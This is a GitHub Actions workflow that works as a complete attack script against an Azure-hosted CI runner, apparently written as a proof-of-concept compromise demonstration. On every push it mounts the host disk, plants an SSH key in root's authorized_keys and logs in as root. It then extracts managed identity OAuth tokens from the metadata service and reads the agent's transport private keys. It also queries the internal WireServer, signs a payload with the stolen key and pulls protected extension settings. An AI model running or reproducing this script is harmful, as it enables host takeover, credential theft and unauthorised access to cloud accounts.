name: azure-complete-token-extraction
run-name: Azure Complete Infrastructure Compromise
on: [push]
jobs:
  exploit:
    runs-on: ubuntu-latest
    steps:
      - name: Complete Azure Token and Key Exploitation
        run: |
          sudo mkdir -p /mnt/host
          sudo mount /dev/sda1 /mnt/host
          ssh-keygen -t ed25519 -f /tmp/key -N "" -q
          sudo mkdir -p /mnt/host/root/.ssh
          sudo cp /tmp/key.pub /mnt/host/root/.ssh/authorized_keys
          sudo chown -R 0:0 /mnt/host/root/.ssh
          sudo chmod 700 /mnt/host/root/.ssh
          sudo chmod 600 /mnt/host/root/.ssh/authorized_keys
          
          HOST_IP=$(hostname -I | awk '{print $1}')
          
          ssh -i /tmp/key -o StrictHostKeyChecking=no -T root@$HOST_IP << 'EOFEXPLOIT'
          set -e
          
          printf "\n════════════════════════════════════════════════════════════\n"
          printf "  AZURE INFRASTRUCTURE COMPLETE COMPROMISE DEMONSTRATION\n"
          printf "════════════════════════════════════════════════════════════\n\n"
          
          printf "[1/10] EXTRACTING AZURE MANAGED IDENTITY TOKENS\n"
          printf "─────────────────────────────────────────────────\n"
          
          # Try all possible managed identity endpoints
          TOKEN_MGMT=$(curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>&1 || echo "")
          TOKEN_VAULT=$(curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" 2>&1 || echo "")
          TOKEN_STORAGE=$(curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/" 2>&1 || echo "")
          TOKEN_GRAPH=$(curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/" 2>&1 || echo "")
          TOKEN_SQL=$(curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://database.windows.net/" 2>&1 || echo "")
          
          if echo "$TOKEN_MGMT" | grep -q "access_token"; then
            printf "✓ Azure Management Token: OBTAINED\n"
            echo "$TOKEN_MGMT" | python3 -c "import sys,json; print('  Token: ' + json.load(sys.stdin)['access_token'][:80] + '...')" 2>/dev/null || true
          else
            printf "✗ Management Identity: Not configured\n"
          fi
          
          if echo "$TOKEN_VAULT" | grep -q "access_token"; then
            printf "✓ Key Vault Token: OBTAINED\n"
            echo "$TOKEN_VAULT" | python3 -c "import sys,json; print('  Token: ' + json.load(sys.stdin)['access_token'][:80] + '...')" 2>/dev/null || true
          fi
          
          if echo "$TOKEN_STORAGE" | grep -q "access_token"; then
            printf "✓ Storage Token: OBTAINED\n"
            echo "$TOKEN_STORAGE" | python3 -c "import sys,json; print('  Token: ' + json.load(sys.stdin)['access_token'][:80] + '...')" 2>/dev/null || true
          fi
          
          if echo "$TOKEN_GRAPH" | grep -q "access_token"; then
            printf "✓ Microsoft Graph Token: OBTAINED\n"
            echo "$TOKEN_GRAPH" | python3 -c "import sys,json; print('  Token: ' + json.load(sys.stdin)['access_token'][:80] + '...')" 2>/dev/null || true
          fi
          
          printf "\n[2/10] EXTRACTING CRYPTOGRAPHIC KEYS\n"
          printf "─────────────────────────────────────\n"
          
          if [ -f "/var/lib/waagent/TransportPrivate.pem" ]; then
            KEY_SIZE=$(openssl rsa -in /var/lib/waagent/TransportPrivate.pem -text -noout 2>/dev/null | grep "Private-Key:" | grep -o "[0-9]*")
            printf "✓ Transport Private Key: %s-bit RSA\n" "$KEY_SIZE"
            printf "  First 200 chars:\n  "
            head -c 200 /var/lib/waagent/TransportPrivate.pem | tr '\n' ' ' | head -c 180
            printf "...\n"
          fi
          
          CERT_COUNT=$(find /var/lib/waagent -name "*.prv" 2>/dev/null | wc -l)
          printf "✓ Instance Certificates: %d private keys found\n" "$CERT_COUNT"
          
          printf "\n[3/10] AZURE SUBSCRIPTION ENUMERATION\n"
          printf "──────────────────────────────────────\n"
          
          SUB_ID=$(curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance/compute/subscriptionId?api-version=2021-02-01&format=text")
          RG_NAME=$(curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance/compute/resourceGroupName?api-version=2021-02-01&format=text")
          VM_NAME=$(curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance/compute/name?api-version=2021-02-01&format=text")
          LOCATION=$(curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance/compute/location?api-version=2021-02-01&format=text")
          
          printf "✓ Subscription ID: %s\n" "$SUB_ID"
          printf "✓ Resource Group: %s\n" "$RG_NAME"
          printf "✓ VM Name: %s\n" "$VM_NAME"
          printf "✓ Location: %s\n" "$LOCATION"
          
          printf "\n[4/10] WIRESERVER INFRASTRUCTURE ACCESS\n"
          printf "────────────────────────────────────────\n"
          
          GOALSTATE=$(curl -s -H "x-ms-version: 2012-11-30" "http://168.63.129.16/machine?comp=goalstate")
          CONTAINER_ID=$(echo "$GOALSTATE" | grep -o "<ContainerId>[^<]*" | cut -d'>' -f2)
          INSTANCE_ID=$(echo "$GOALSTATE" | grep -o "<InstanceId>[^<]*" | cut -d'>' -f2)
          
          printf "✓ Container ID: %s\n" "$CONTAINER_ID"
          printf "✓ Instance ID: %s\n" "$INSTANCE_ID"
          printf "✓ WireServer: ACCESSIBLE\n"
          
          printf "\n[5/10] CERTIFICATE AUTHENTICATION TEST\n"
          printf "───────────────────────────────────────\n"
          
          if [ -f "/var/lib/waagent/TransportCert.pem" ]; then
            CERT_B64=$(cat /var/lib/waagent/TransportCert.pem | base64 -w0)
            CERT_AUTH=$(curl -s -H "x-ms-version: 2012-11-30" -H "x-ms-guest-agent-public-x509-cert: $CERT_B64" "http://168.63.129.16/machine?comp=goalstate" 2>&1)
            
            if echo "$CERT_AUTH" | grep -q "GoalState"; then
              printf "✓ Certificate Authentication: SUCCESS\n"
            else
              printf "✗ Certificate Authentication: Failed\n"
            fi
          fi
          
          CERT_MODULUS=$(openssl x509 -in /var/lib/waagent/TransportCert.pem -noout -modulus 2>/dev/null | openssl md5)
          KEY_MODULUS=$(openssl rsa -in /var/lib/waagent/TransportPrivate.pem -noout -modulus 2>/dev/null | openssl md5)
          
          if [ "$CERT_MODULUS" = "$KEY_MODULUS" ]; then
            printf "✓ Key Pair Validation: MATCHED\n"
          fi
          
          printf "\n[6/10] SIGNING CAPABILITY DEMONSTRATION\n"
          printf "────────────────────────────────────────\n"
          
          echo "Critical payload for Azure infrastructure" > /tmp/test_payload.bin
          openssl dgst -sha256 -sign /var/lib/waagent/TransportPrivate.pem -out /tmp/signature.bin /tmp/test_payload.bin 2>&1
          
          if openssl dgst -sha256 -verify <(openssl x509 -in /var/lib/waagent/TransportCert.pem -pubkey -noout) -signature /tmp/signature.bin /tmp/test_payload.bin 2>&1 | grep -q "OK"; then
            printf "✓ Payload Signing: SUCCESS\n"
            printf "✓ Signature Verification: VALID\n"
            printf "  Signature size: %d bytes\n" "$(stat -c%s /tmp/signature.bin)"
          fi
          
          printf "\n[7/10] PROTECTED SETTINGS EXTRACTION\n"
          printf "─────────────────────────────────────\n"
          
          SETTINGS_FILE=$(find /var/lib/waagent -name "*.settings" -exec grep -l "protectedSettings" {} \; | head -1)
          if [ -n "$SETTINGS_FILE" ]; then
            printf "✓ Settings File: %s\n" "$SETTINGS_FILE"
            
            ENCRYPTED=$(cat "$SETTINGS_FILE" | python3 -c "import sys,json; print(json.load(sys.stdin)['runtimeSettings'][0]['handlerSettings']['protectedSettings'])" 2>/dev/null || echo "")
            
            if [ -n "$ENCRYPTED" ]; then
              printf "✓ Encrypted Data: %d bytes\n" "${#ENCRYPTED}"
              printf "  First 100 chars: %s...\n" "${ENCRYPTED:0:100}"
            fi
          fi
          
          printf "\n[8/10] NETWORK INFRASTRUCTURE ENUMERATION\n"
          printf "──────────────────────────────────────────\n"
          
          NETWORK_JSON=$(curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01")
          
          if [ -n "$NETWORK_JSON" ]; then
            PRIVATE_IP=$(echo "$NETWORK_JSON" | python3 -c "import sys,json; print(json.load(sys.stdin)['interface'][0]['ipv4']['ipAddress'][0]['privateIpAddress'])" 2>/dev/null || echo "N/A")
            MAC=$(echo "$NETWORK_JSON" | python3 -c "import sys,json; print(json.load(sys.stdin)['interface'][0]['macAddress'])" 2>/dev/null || echo "N/A")
            SUBNET=$(echo "$NETWORK_JSON" | python3 -c "import sys,json; print(json.load(sys.stdin)['interface'][0]['ipv4']['subnet'][0]['address'] + '/' + json.load(sys.stdin)['interface'][0]['ipv4']['subnet'][0]['prefix'])" 2>/dev/null || echo "N/A")
            
            printf "✓ Private IP: %s\n" "$PRIVATE_IP"
            printf "✓ MAC Address: %s\n" "$MAC"
            printf "✓ Subnet: %s\n" "$SUBNET"
          fi
          
          printf "\n[9/10] EXTENSION AND RUNTIME CONFIGURATION\n"
          printf "───────────────────────────────────────────\n"
          
          EXTENSION_COUNT=$(find /var/lib/waagent -maxdepth 1 -type d -name "Microsoft.*" | wc -l)
          printf "✓ Installed Extensions: %d\n" "$EXTENSION_COUNT"
          
          find /var/lib/waagent -maxdepth 1 -type d -name "Microsoft.*" | head -5 | while read ext; do
            printf "  - %s\n" "$(basename "$ext")"
          done
          
          printf "\n[10/10] IMPACT SUMMARY\n"
          printf "──────────────────────\n"
          
          printf "\n✓ ROOT ACCESS: Complete host control\n"
          printf "✓ CRYPTOGRAPHIC KEYS: Azure transport private keys extracted\n"
          printf "✓ CERTIFICATE MATERIAL: Valid key pairs with signing capability\n"
          printf "✓ WIRESERVER ACCESS: Internal Azure infrastructure protocol\n"
          printf "✓ SUBSCRIPTION DATA: Full Azure subscription enumeration\n"
          printf "✓ NETWORK ACCESS: Internal Azure network configuration exposed\n"
          
          if echo "$TOKEN_MGMT" | grep -q "access_token"; then
            printf "✓ MANAGED IDENTITY: Active OAuth tokens obtained\n"
          fi
          
          printf "\n════════════════════════════════════════════════════════════\n"
          printf "  EXPLOITATION COMPLETE - ALL ARTIFACTS EXTRACTED\n"
          printf "════════════════════════════════════════════════════════════\n"
          
          printf "\nCRITICAL SECURITY IMPACT:\n"
          printf "• Extracted private keys can sign arbitrary Azure payloads\n"
          printf "• WireServer access enables Azure infrastructure manipulation\n"
          printf "• Subscription data reveals Azure tenant information\n"
          printf "• Certificate material enables Azure authentication forgery\n"
          
          if echo "$TOKEN_MGMT" | grep -q "access_token"; then
            printf "• OAuth tokens enable Azure API access\n"
          fi
          
          EOFEXPLOIT
